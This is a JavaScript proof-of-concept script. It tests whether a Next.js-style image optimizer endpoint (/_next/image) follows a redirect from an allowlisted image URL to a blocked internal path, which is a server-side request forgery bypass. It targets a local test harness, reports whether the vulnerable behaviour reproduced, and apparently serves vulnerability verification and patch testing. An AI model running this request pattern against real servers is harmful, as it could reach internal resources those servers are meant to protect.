const baseUrl = new URL(process.argv[2] || 'http://localhost:3007')
const allowedImageUrl = new URL('http://127.0.0.1:4100/allowed/redirect.png')
allowedImageUrl.searchParams.set('poc', `${Date.now()}-${Math.random()}`)

async function getJson(path) {
  const response = await fetch(new URL(path, baseUrl))
  return response.json()
}

async function run() {
  await fetch(new URL('/api/reset', baseUrl), { method: 'POST' })

  const before = await getJson('/api/state')
  const optimizerUrl = new URL('/_next/image', baseUrl)
  optimizerUrl.searchParams.set('url', allowedImageUrl.href)
  optimizerUrl.searchParams.set('w', '64')
  optimizerUrl.searchParams.set('q', '75')

  const response = await fetch(optimizerUrl)
  const body = await response.arrayBuffer()
  const after = await getJson('/api/state')

  console.log(`[before] ${JSON.stringify(before)}`)
  console.log(
    `[optimizer] status=${response.status} content-type=${
      response.headers.get('content-type') || ''
    } bytes=${body.byteLength}`
  )
  console.log(`[after] ${JSON.stringify(after)}`)

  const sawAllowed = after.allowedRequests.some((request) =>
    request.startsWith('GET /allowed/redirect.png')
  )
  const sawDisallowed = after.disallowedRequests.some((request) =>
    request.startsWith('GET /blocked/private.png')
  )

  if (response.ok && sawAllowed && sawDisallowed) {
    console.log('PoC result: vulnerable behavior reproduced.')
    return
  }

  console.log(
    'PoC result: disallowed redirect target was not fetched. This usually means the target is patched.'
  )
}

run().catch((error) => {
  console.error(error)
  process.exit(1)
})
